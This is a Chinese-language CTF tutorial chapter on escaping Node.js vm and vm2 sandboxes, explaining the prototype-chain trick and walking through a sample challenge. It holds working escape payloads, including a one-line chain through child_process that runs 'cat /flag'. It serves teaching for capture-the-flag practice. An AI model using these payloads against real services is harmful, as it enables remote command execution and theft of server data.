---
comments: true
---

# JS沙箱逃逸

## 什么是沙箱，什么是沙箱逃逸

在 Node.js 相关的 Web 题里，经常会遇到这样的场景：服务端允许你提交一段 JavaScript 代码，然后「在安全的环境里」帮你执行并返回结果——比如在线运行代码的小工具、模板渲染、表达式求值等。

这个「安全的环境」就是 **沙箱（Sandbox）**。它的目标是：即使执行了攻击者提交的任意代码，也不能碰到沙箱外的东西——文件系统、环境变量、网络、其他进程。

**沙箱逃逸（Sandbox Escape）**，顾名思义，就是想办法从这段受限代码里「够到」沙箱外面对象，最终达到任意命令执行。这类题的最终形态和 [RCE](./rce.md) 章节一样——拿到 shell 或者读 flag，区别只在于前面多了一层「笼子」，我们要先把它撬开。

本章围绕 Node.js 生态中最常见的两个沙箱实现展开：官方内置的 `vm` 模块，和曾经最流行的第三方沙箱库 `vm2`。

## Node.js vm 模块的沙箱机制

### vm 模块简介

`vm` 是 Node.js 内置模块，可以在一个独立的 V8 上下文（context）中执行代码：

```javascript
const vm = require('vm');

// 在一个全新的上下文中执行代码，sandbox 里的变量会成为上下文内的全局变量
const sandbox = { name: 'ctf' };
vm.createContext(sandbox);
vm.runInContext('name + " is running"', sandbox);
```

也可以一步完成：

```javascript
const result = vm.runInNewContext('1 + 1', {});
console.log(result); // 2
```

直觉上，新上下文里既没有 `require`，也没有 `process`、`global` 这些 Node.js 的全局对象，代码好像被「关起来了」。很多题目正是基于这个直觉出的题。

但 **Node.js 官方文档明确写着：`vm` 模块不是安全机制 **（"The vm module is not a security mechanism. Do not use it to run untrusted code."）。原因在于：新上下文虽然隔离了全局变量，但 JavaScript 的** 对象和原型链是可以穿透上下文的**——只要你能在沙箱内拿到一个「宿主环境创建的对象」，就能顺着它的原型链爬回宿主环境。

### vm2 库简介

正因为 `vm` 不安全，社区出现了 `vm2`——它用 `Proxy` 把宿主对象层层包裹，拦截属性访问，试图堵死原型链这条路：

```javascript
const { VM } = require('vm2');

const vm = new VM(); // 默认沙箱里没有 require、process
vm.run('1 + 1');     // 安全地执行
```

`vm2` 曾经是事实标准（周下载量过千万），但它从诞生起就在和逃逸漏洞赛跑。2023 年，研究人员接连公开了多个逃逸漏洞（如 **CVE-2023-29017**、**CVE-2023-37466**、**CVE-2023-37903** 等），原理五花八门。最终作者在 2023 年 7 月宣布 **放弃维护 vm2**，并公开承认无法保证其安全性。

对 CTF 选手来说，这件事的意义是：

- 见到题目用 `vm`，直接尝试经典的 `this.constructor.constructor` 逃逸；
- 见到题目用 `vm2`（尤其是老版本，题目环境里经常能看到 `package.json` 或提示），就去回忆对应版本的已知 CVE 套路。

## 经典逃逸 payload 原理

### this.constructor.constructor：顺着原型链拿 Function

这是 vm 沙箱逃逸最经典、也是必须背下来的一条 payload：

```javascript
this.constructor.constructor('return process')()
```

一行代码里发生了三件事，我们拆开看。

**第一步：`this` 是谁？**

在 `vm.runInNewContext(code, sandbox)` 里，如果 `sandbox` 是宿主环境创建的一个普通对象（比如 `{}`），那么沙箱内的顶层 `this`（全局对象）就是包裹着这个宿主对象的代理。于是 `this` 的原型链直通宿主环境。

**第二步：`.constructor` 链为什么等于 `Function`？**

回忆 JavaScript 的原型链常识：

```javascript
const obj = {};
obj.constructor;             // [Function: Object]  —— obj 由 Object 构造
obj.constructor.constructor; // [Function: Function] —— Object 自己由 Function 构造
```

关键在这里：沙箱内拿到的 `this.constructor` 是 **宿主环境** 的 `Object`，所以 `this.constructor.constructor` 就是 **宿主环境** 的 `Function` 构造函数。

**第三步：拿到宿主的 Function 意味着什么？**

`Function` 构造函数可以把字符串编译成函数体执行，等价于一个 `eval`：

```javascript
const f = Function('return 1 + 1');
f(); // 2
```

用 **宿主的** `Function` 创建出来的函数，执行时就在 **宿主环境** 里，拥有完整的 Node.js 全局——`process`、`require` 全都能用。于是：

```javascript
this.constructor.constructor('return process')()
```

就是「用宿主 Function 造一个返回 `process` 的函数，立刻调用它」，沙箱应声而破。

如果顶层 `this` 拿不到（比如题目用了严格模式或者把上下文掏空了），思路不变：**随便找一个来自宿主的对象**，顺着它的 `constructor.constructor` 爬。常见替代品：

```javascript
({}).constructor.constructor        // 宿主普通对象
[].constructor.constructor          // 数组 -> Array -> Function
''.constructor.constructor          // 字符串 -> String -> Function
```

注意：如果字符串/数字字面量是在沙箱内创建的，它们的构造器属于沙箱上下文；这些替代品能成立的前提，是对象本身来自宿主（比如 sandbox 里被传进来的变量、异常对象等）。做题时挨个试一遍成本很低。

### vm2 的原型链逃逸思想

vm2 用 `Proxy` 拦截了属性访问，直接走 `constructor` 这条路会被拦下。但历史上的 CVE 万变不离其宗，核心思想是同一个：**宿主和沙箱是两个上下文，两边交换数据时，只要有一个宿主对象「裸奔」进了沙箱（或沙箱对象绕过代理进了宿主），拦截就形同虚设。**

以 CVE-2023-29017 的思路为例（了解思想即可，不要求背 payload）：vm2 在沙箱内抛出异常、宿主侧捕获处理时，部分代码路径会拿到 **未经 Proxy 包裹的宿主异常对象**。攻击者在沙箱内重写 `Error.prepareStackTrace` 这个自定义错误堆栈的钩子，诱使宿主在处理堆栈时调用它，从而拿到宿主对象的引用——之后又是熟悉的 `constructor.constructor` 一套。

这给了我们两个通用做题策略：

1. **找数据交换点**：异常、回调、参数传递、返回值——凡是沙箱内外有交互的地方，都可能有对象漏过代理；
2. **拿到任意宿主对象后，统一收口到 `constructor.constructor` 拿 Function**，后面的事就和 vm 逃逸一模一样了。

## 逃逸之后：child_process 执行命令

拿到宿主的 `process` 只是第一步，最终目标是执行系统命令。Node.js 里执行命令靠内置模块 `child_process`。在逃逸出的宿主环境里，有几种拿到它的方式：

**方式一：`process.mainModule.require`**

`process.mainModule` 指向程序的入口模块，模块实例上有 `require` 方法：

```javascript
const process = this.constructor.constructor('return process')();
const cp = process.mainModule.require('child_process');
console.log(cp.execSync('id').toString());
```

**方式二：用 `process.binding` 或 `process.getBuiltinModule`**

新版本 Node.js（>= 22.3）提供了 `process.getBuiltinModule`，不依赖入口模块：

```javascript
const cp = process.getBuiltinModule('child_process');
```

老版本可以用 `process.binding('spawn_sync')` 这种底层接口，代码较繁琐，做题时优先试前两种。

**方式三：合并成一行（最常用的完整 payload）**

```javascript
this.constructor.constructor('return process.mainModule.require("child_process").execSync("cat /flag").toString()')()
```

把整条链都写进 `Function` 的函数体里，直接返回命令输出。

## CTF 例题：在线代码运行平台

下面用一道典型题把整条思路串一遍。题目源码（简化）：

```javascript
// app.js
const express = require('express');
const vm = require('vm');

const app = express();
app.use(express.json());

app.post('/run', (req, res) => {
    const code = req.body.code;
    if (typeof code !== 'string' || code.length > 200) {
        return res.json({ error: 'bad code' });
    }
    try {
        const sandbox = {};            // 空沙箱，看起来什么都没有
        const result = vm.runInNewContext(code, sandbox, { timeout: 1000 });
        res.json({ result: String(result) });
    } catch (e) {
        res.json({ error: String(e) });
    }
});

app.listen(3000);
```

目标是读取服务器上的 `/flag`。

### 第一步：摸清沙箱里有什么

先探一下沙箱内的全局环境，提交：

```json
{"code": "Object.getOwnPropertyNames(this).join(',')"}
```

返回大致是：

```json
{"result": "Object,Function,Array,String,...,JSON,globalThis"}
```

是一个干净的 V8 上下文：有 JS 内建对象，但没有 `require`、`process`、`module`。直接写 `require('child_process')` 会报 `require is not defined`。符合预期——需要逃逸。

### 第二步：验证原型链通向宿主

试试经典的 `constructor` 链能不能拿到 `Function`：

```json
{"code": "this.constructor.constructor === Function"}
```

返回：

```json
{"result": "true"}
```

注意这一小步的信息量：`Function` 是沙箱内自己的 Function，而比较结果是 `true`，说明 `this.constructor.constructor` 拿到的 **也是某个上下文里正常的 Function**。再进一步确认它能用来访问宿主全局：

```json
{"code": "this.constructor.constructor('return typeof process')()"}
```

返回：

```json
{"result": "object"}
```

`process` 存在且是 `object`——如果是沙箱内的 Function，这里应该是 `undefined`（因为沙箱上下文里没有 `process`）。**逃逸已经成功一半**：我们现在能在宿主环境里执行任意代码了。

如果这一步 `this` 拿不到（比如题目把沙箱改成了 `Object.create(null)`，`this.constructor` 是 `undefined`），就换思路：找宿主传进来的对象。比如有的题目会在 sandbox 里预置 `sandbox = { output: '' }`，那就用 `output.constructor.constructor`；或者利用异常对象。总之「找宿主对象 → constructor.constructor」的套路不变。

### 第三步：拿 child_process

从宿主 `process` 走到 `child_process`：

```json
{"code": "this.constructor.constructor('return process.mainModule.require(\"child_process\")')().toString()"}
```

能返回模块对象（字符串化后是一大段 `[object Object]` 或模块信息），说明 `require` 可用。如果题目环境里 `mainModule` 是 `undefined`（比如以 ESM 方式启动），改用 `process.getBuiltinModule('child_process')` 再试。

### 第四步：执行命令读 flag

组装最终 payload，把整条链塞进 `Function` 的函数体：

```json
{"code": "this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"cat /flag\").toString()')()"}
```

返回：

```json
{"result": "flag{vm_sandbox_escape_is_fun}"}
```

收工。完整 payload 的逻辑链是：

```text
this（宿主对象的全局代理）
 └─ .constructor          → 宿主的 Object
     └─ .constructor      → 宿主的 Function
         └─ ('...')()     → 在宿主环境执行函数体：
             └─ process.mainModule.require('child_process')
                 └─ .execSync('cat /flag').toString()
```

每一步只解决一个问题：先逃出上下文，再恢复 `require` 能力，最后执行命令。这个「找宿主对象 → 爬 constructor 链 → Function → process → child_process」的链条，就是几乎所有 JS 沙箱逃逸题的通用骨架。

## 小结

- `vm` 模块 **官方声明不是安全边界**，见到它直接试 `this.constructor.constructor`；
- `vm2` 已被作者弃坑，老版本存在大量已知逃逸 CVE，核心思想是抓住沙箱内外数据交换时漏过 `Proxy` 的宿主对象；
- 逃逸的通用骨架：**宿主对象 → `constructor.constructor` → 宿主 `Function` → `process` → `child_process`**；
- 做题时 `this` 走不通就找替代品：传进沙箱的变量、异常对象、回调参数，都是候选的宿主对象。
